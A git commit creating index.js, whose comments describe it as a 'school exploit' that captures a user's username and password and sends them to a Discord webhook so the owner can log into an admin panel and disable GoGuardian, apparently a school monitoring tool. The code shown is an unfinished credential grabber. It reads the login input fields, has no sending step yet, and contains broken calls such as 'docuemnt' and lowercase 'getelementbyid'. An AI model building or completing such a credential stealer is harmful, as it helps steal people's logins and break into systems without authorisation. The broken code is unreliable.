ff9d18b77d09e49cd9c2e26bae2b27deec984cae
Awire9966 <65136929+Awire9966@users.noreply.github.com>
2021-09-23 11:57:48 -0400

    Create index.js

---
+++ index.js
@@ -0,0 +1,15 @@
+//Fuck GoGaurdian. Best School Exploit Ever!
+//This code sends a user's username and password to
+//a discord webhook for the owner to login to
+// Admin panel and Disable GoGaurdian.
+var usr = document.getelementbyid("UserInput")
+var pwd = document.getelementbyid("PassImput")
+var next = docuemnt.getelementbyid("next")
+var user = 0
+var pass = 0
+function NextButton1()
+{
+ user = usr.value
+
+ 
+}
